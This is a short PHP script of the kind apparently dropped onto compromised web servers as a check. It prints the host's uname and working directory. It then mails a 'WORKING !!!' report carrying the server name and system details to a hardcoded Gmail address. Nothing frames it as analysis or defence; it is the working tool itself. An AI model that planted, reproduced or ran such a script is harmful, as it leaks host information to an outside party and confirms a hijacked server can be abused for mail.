<?php
echo "Uname: ";
echo "".php_uname()."";
echo "<br>";
echo "".getcwd()."";
$to = "aqilnaila23@gmail.com";
$xx = rand();
$txt = "Result Report Test - ".$xx." WORKING !!!";
$headers = "From: webmaster@".$_SERVER['SERVER_NAME']."" . "\r\n" .
"CC: ".php_uname()."";

mail($to,$txt,$headers);
echo "<br>";
echo "<font color='red'>";
echo "Report ".$xx." Sent!";
?>
